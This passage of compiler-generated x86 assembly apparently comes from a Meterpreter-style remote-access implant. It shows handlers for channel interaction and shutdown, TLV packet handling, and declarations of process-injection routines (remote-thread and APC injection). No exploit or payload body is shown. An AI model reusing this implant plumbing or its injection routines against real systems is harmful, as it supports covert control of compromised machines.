	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-16(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L185
L187:
	movl	$50, -12(%ebp)
L185:
	cmpl	$0, -16(%ebp)
	je	L188
	movl	-16(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
L188:
	movl	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$131144, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_request_core_channel_interact
	.def	_remote_request_core_channel_interact;	.scl	2;	.type	32;	.endef
_remote_request_core_channel_interact:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -12(%ebp)
	movl	$131122, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -24(%ebp)
	movl	$524300, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_bool
	movb	%al, -25(%ebp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_find_by_id
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	je	L191
	movl	-20(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	cmpl	$0, -16(%ebp)
	je	L192
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_get_class
	testl	%eax, %eax
	je	L192
	movl	-20(%ebp), %eax
	addl	$24, %eax
	movl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L192
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	movzbl	-25(%ebp), %ecx
	movl	-32(%ebp), %edx
	movl	(%edx), %edx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-20(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -12(%ebp)
L192:
	movzbl	-25(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_set_interactive
	movl	-20(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
L191:
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
	movl	$0, %eax
	leave
	ret
	.globl	_remote_request_core_shutdown
	.def	_remote_request_core_shutdown;	.scl	2;	.type	32;	.endef
_remote_request_core_shutdown:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$1, 8(%esp)
	movl	$524300, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_bool
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
	movl	16(%ebp), %eax
	movl	-20(%ebp), %edx
	movl	%edx, (%eax)
	movl	$0, %eax
	leave
	ret
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_calloc;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_wstring;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_uint;	.scl	2;	.type	32;	.endef
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
	.def	_wcsncmp;	.scl	2;	.type	32;	.endef
	.def	_memcpy;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_raw;	.scl	2;	.type	32;	.endef
	.def	_wcslen;	.scl	2;	.type	32;	.endef
	.def	_wcsncpy;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_wcscpy;	.scl	2;	.type	32;	.endef
	.def	_packet_create_response;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_uint;	.scl	2;	.type	32;	.endef
	.def	_packet_create_group;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_wstring;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_raw;	.scl	2;	.type	32;	.endef
	.def	_packet_add_group;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_response;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_empty_response;	.scl	2;	.type	32;	.endef
	.def	_wcscmp;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_inject_via_remotethread;	.scl	2;	.type	32;	.endef
	.def	_inject_via_apcthread;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_string;	.scl	2;	.type	32;	.endef
	.def	_channel_create;	.scl	2;	.type	32;	.endef
	.def	_channel_get_id;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit;	.scl	2;	.type	32;	.endef
	.def	_channel_find_by_id;	.scl	2;	.type	32;	.endef
	.def	_lock_acquire;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv;	.scl	2;	.type	32;	.endef
	.def	_channel_get_class;	.scl	2;	.type	32;	.endef
	.def	_channel_write_to_buffered;	.scl	2;	.type	32;	.endef
	.def	_lock_release;	.scl	2;	.type	32;	.endef
	.def	_channel_read_from_buffered;	.scl	2;	.type	32;	.endef
	.def	_channel_is_flag;	.scl	2;	.type	32;	.endef
	.def	_channel_write;	.scl	2;	.type	32;	.endef
	.def	_channel_destroy;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_bool;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_bool;	.scl	2;	.type	32;	.endef
	.def	_channel_set_interactive;	.scl	2;	.type	32;	.endef
